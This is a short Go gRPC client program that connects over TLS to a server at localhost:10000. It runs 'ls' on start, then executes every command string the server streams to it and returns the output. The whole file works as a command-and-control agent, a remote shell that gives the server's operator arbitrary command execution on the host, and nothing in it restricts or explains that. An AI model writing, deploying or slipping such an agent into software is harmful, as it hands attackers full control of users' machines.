package main

import (
	pb "client/pb/simple"
	"context"
	"fmt"
	"io"
	"log"
	"os/exec"
	"strings"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	// "google.golang.org/grpc/credentials/insecure"
)

func main() {
	cmd := exec.Command("ls")
	output, err := cmd.Output()
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(string(output))

	var opts []grpc.DialOption
	tls, err := credentials.NewClientTLSFromFile("../../X509/ca-cert.crt", "crasite.com")
	opts = append(opts, grpc.WithTransportCredentials(tls))

	conn, err := grpc.Dial("localhost:10000", opts...)
	defer conn.Close()
	client := pb.NewSimpleClient(conn)
	runServerChat(client)
}

func runServerChat(client pb.SimpleClient) {
	ctx := context.Background()
	stream, err := client.Default(ctx)
	if err != nil {
		log.Fatalf("client.RouteChat failed: %v", err)
	}
	waitc := make(chan struct{})
	go func() {
		for {
			in, err := stream.Recv()
			if err == io.EOF {
				// read done.
				close(waitc)
				return
			}
			if err != nil {
				log.Fatalf("client.RouteChat failed: %v", err)
			}
			log.Printf("Got Question %v with (%v)", in.Question, in.ExtraText)
			cmd_args := strings.Split(in.ExtraText, " ")
			cmd := exec.Command(cmd_args[0], cmd_args[1:]...)
			output, err := cmd.Output()
			if err != nil {
				stream.Send(&pb.Client{Request: &pb.Client_Response{Response: err.Error()}})
			} else {
				stream.Send(&pb.Client{Request: &pb.Client_Response{Response: string(output)}})
			}
		}
	}()
	// for _, note := range notes {
	// 	if err := stream.Send(note); err != nil {
	// 		log.Fatalf("client.RouteChat: stream.Send(%v) failed: %v", note, err)
	// 	}
	// }
	<-waitc
}
